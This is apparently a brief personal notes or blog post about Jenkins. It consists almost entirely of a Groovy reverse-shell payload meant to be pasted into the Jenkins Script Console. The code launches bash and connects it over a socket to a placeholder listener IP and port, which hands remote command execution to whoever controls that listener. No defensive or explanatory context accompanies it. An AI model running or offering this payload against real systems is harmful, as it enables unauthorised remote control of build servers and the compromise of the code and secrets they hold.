---
layout: post
title: jenkins
tags: jenkins groovy cicd  groovy
created: "2022-05-12"
updated: "2022-05-12"
---

# jenkins

Manage Jenkins > Script Console

```
String host=”<listen_ip>”;
int port=<listen_port>;
String cmd=”bash”;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();Thread.sleep(50);
try {
    p.exitValue();
    break;
}catch (Exception e){}};
p.destroy();s.close();
```

